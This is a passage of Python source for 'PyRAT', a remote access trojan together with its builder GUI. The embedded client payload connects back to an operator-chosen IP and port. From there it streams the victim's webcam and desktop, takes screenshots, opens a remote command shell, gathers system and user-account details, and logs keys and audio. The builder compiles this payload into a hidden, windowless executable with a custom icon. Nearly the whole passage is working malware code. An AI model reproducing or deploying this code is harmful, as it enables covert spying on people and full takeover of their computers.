    send_share_stats()
    send_cam_stats()


def share_desktop(client):
    global connected
    global stream
    try:
        while stream:
            frame = ImageGrab.grab()
            img_bytes = np.array(frame).tobytes()
            client.sendall(img_bytes)
        client.send(b"<STOPPED>")
    except ConnectionResetError:
        if client:
            client.close()
        stream = False
        connected = False
        pass


def share_cam(client):
    global connected
    global cam
    try:
        data = cv2.VideoCapture(0)
        if data.isOpened():
            client.send(b"<START>")
            while cam:
                success, frame = data.read()
                img_bytes = frame.tobytes()
                client.sendall(img_bytes)
            data.release()
            client.send(b"<STOPPED>")
        else:
            data.release()
            client.send(b"<NO_CAM>")

    except ConnectionResetError:
        if client:
            client.close()
        cam = False
        connected = False
        pass
    except AttributeError:
        cam = False
        pass


def snap(client):
    global connected
    try:
        snap = cv2.VideoCapture(0)
        if snap.isOpened():
            client.send(b"<START>")
            success, frame = snap.read()
            snap.release()
            img_bytes = frame.tobytes()
            client.sendall(img_bytes)
            client.send(b"<END>")
        else:
            snap.release()
            client.send(b"<NO_CAM>")

    except ConnectionResetError:
        if client:
            client.close()
        connected = False
        pass


def screenshot(client):
    global connected
    try:
        frame = ImageGrab.grab()
        img_np = np.array(frame)
        _, img_encoded = cv2.imencode('.png', img_np)
        img_bytes = img_encoded.tobytes()
        client.sendall(img_bytes)
        client.send(b"<END>")

    except ConnectionResetError:
        if client:
            client.close()
        connected = False
        pass


def shell(client):
    global local_shell
    global connected
    while local_shell:
        try:
            command = client.recv(4096).decode(errors="ignore").strip()

            if command == "<END_SHELL>":
                local_shell = False
                return
            elif command == "<END>":
                local_shell = False
                connected = False
                return

            else:
                try:
                    client.send(os.getcwd().encode())
                    if command.startswith("cd "):
                        try:
                            os.chdir(command[3:])
                            output = f">>'{r"{os.getcwd()}\\"}'<<"
                        except FileNotFoundError:
                            output = "Directory not found!"
                        except PermissionError:
                            output = "Access denied!"

                    elif command.lower() == "cmd" or command.lower() == "powershell":
                        output = "Operation not permitted!"

                    else:
                        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode(
                            errors="ignore")

                except subprocess.CalledProcessError as e:
                    output = e.output.decode(errors="ignore")

                client.send(output.encode())
                time.sleep(0.1)

        except ConnectionResetError:
            if client:
                client.close()
            client = None
            connected = False
            local_shell = False
            pass

        except AttributeError:
            client = None
            connected = False
            local_shell = False
            pass


def recv():
    global connected
    global client
    while True:
        while not connected:
            client = None
            try:
                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client.connect(("{str(ip)}", {int(port)}))
                client.send("<PyRAT>".encode())
                if client.recv(1024).decode() == "<PyRAT>":
                    connected = True

                else:
                    client.close()
                time.sleep(3)
            except ConnectionResetError:
                time.sleep(3)
            except ConnectionRefusedError:
                time.sleep(3)

        try:
            global times
            command = client.recv(4096).decode()

            if command == "<STATS>":
                threading.Thread(target=send_stats, args=(client,)).start()

            elif command == "<INFO>":
                info = subprocess.check_output("wmic cpu get name,NumberOfCores,NumberOfLogicalProcessors", shell=True)
                info += subprocess.check_output("wmic memorychip get capacity,Speed", shell=True)
                info += subprocess.check_output("wmic diskdrive get model,size", shell=True)
                info += subprocess.check_output("systeminfo", shell=True)
                info += subprocess.check_output("net user", shell=True)
                info += subprocess.check_output("ipconfig", shell=True)
                client.sendall(info)

            elif command == "<CAM>":
                global cam
                cam = True
                threading.Thread(target=share_cam, args=(client,)).start()

            elif command == "<SNAP>":
                snap(client)

            elif command == "<SCREENSHOT>":
                screenshot(client)

            elif command == "<SHARE>":
                global stream
                stream = True
                threading.Thread(target=share_desktop, args=(client,)).start()

            elif command == "<AUDIO>":
                global rec_audio
                rec_audio = True
                threading.Thread(target=audio, args=(client,)).start()

            elif command == "<SHELL>":
                global local_shell
                local_shell = True
                shell(client)

            elif command == "<STOP_AUDIO>":
                rec_audio = False

            elif command == "<LOG>":
                global Logging
                Logging = True
                threading.Thread(target=log, args=(client,)).start()

            elif command == "<STOP_LOG>":
                Logging = False

            elif command == "<STOP_CAM>":
                cam = False

            elif command == "<STOP_SHARE>":
                stream = False

            elif command == "<END>":
                client.close()
                connected = False
                client = None
                local_shell = False
                connected = False
                cam = False
                stream = False
                Logging = False
                rec_audio = False

            elif command == "<SHUTDOWN>":
                os.system("shutdown /s /t 0")

            elif command == "<RESTART>":
                os.system("shutdown /r /t 0")

            elif command == "<LOCK>":
                os.system("rundll32.exe user32.dll,LockWorkStation")

            elif command == "<KILL>":
                out = subprocess.check_output("tasklist", shell=True).decode(errors="ignore")
                client.sendall(out.encode())
                pass

            elif command == "<KILLED>":
                PID = client.recv(1024).decode()
                out = subprocess.check_output(f"taskkill /F /PID {r"{PID}"}")
                client.send(out)

            else:
                pass

        except subprocess.CalledProcessError:
            client.send("None".encode())

        except ConnectionResetError:
            if client:
                client.close()
            client = None
            connected = False
            time.sleep(3)
            pass

        except AttributeError:
            if client:
                client.close()
            client = None
            connected = False
            time.sleep(3)
            pass

        except UnboundLocalError:
            if client:
                client.close()
            client = None
            connected = False
            time.sleep(3)
            pass


try:
    recv()
except:
    recv()
                """
                if self.build_icon and self.set_icon.get() and self.set_name.get().strip():
                    filename = self.set_name.get().strip()
                    self.Error_Label.configure(text="")
                    self.Build_ip.delete("0", "end")
                    self.Build_port.delete("0", "end")
                    self.set_name.delete("0", "end")
                    self.B_build.configure(text="Building", state="disabled")
                    ready = open("ready.py", "w")
                    ready.write(data)
                    ready.close()
                    subprocess.run(f"python -m nuitka --onefile --windows-console-mode=disable  --windows-icon-from-ico={self.build_icon} --output-filename={filename} ready.py", shell=True)
                    subprocess.run("del ready.py", shell=True)
                    subprocess.run("rmdir /S /Q ready.build", shell=True)
                    subprocess.run("rmdir /S /Q ready.dist", shell=True)
                    subprocess.run("rmdir /S /Q ready.onefile-build", shell=True)
                    self.B_build.configure(text="Build", state="enabled")

                if self.set_name.get().strip() and not self.set_icon.get():
                    filename = self.set_name.get().strip()
                    self.Error_Label.configure(text="")
                    self.Build_ip.delete("0", "end")
                    self.Build_port.delete("0", "end")
                    self.set_name.delete("0", "end")
                    self.B_build.configure(text="Building", state="disabled")
                    ready = open("ready.py", "w")
                    ready.write(data)
                    ready.close()
                    subprocess.run(f"python -m nuitka --onefile --windows-console-mode=disable --output-filename={filename} ready.py", shell=True)
                    subprocess.run("del ready.py", shell=True)
                    subprocess.run("rmdir /S /Q ready.build", shell=True)
                    subprocess.run("rmdir /S /Q ready.dist", shell=True)
                    subprocess.run("rmdir /S /Q ready.onefile-build", shell=True)
                    self.B_build.configure(text="Build", state="enabled")

                elif not self.set_name.get():
                    self.Error_Label.configure("Filename not set!")
                elif self.set_icon.get() and not self.build_icon and self.set_name.get().strip():
                    self.Error_Label.configure("Icon not set!")

            threading.Thread(target=build).start()

        except ValueError:
            self.Error_Label.configure(text="Enter valid port!")
        except ZeroDivisionError:
            self.Error_Label.configure(text="Enter valid ip!")


if __name__ == '__main__':
    try:
        root = CTk()
        PyRAT(root)
        root.mainloop()

    except Exception as e:
        print(e)
        pass
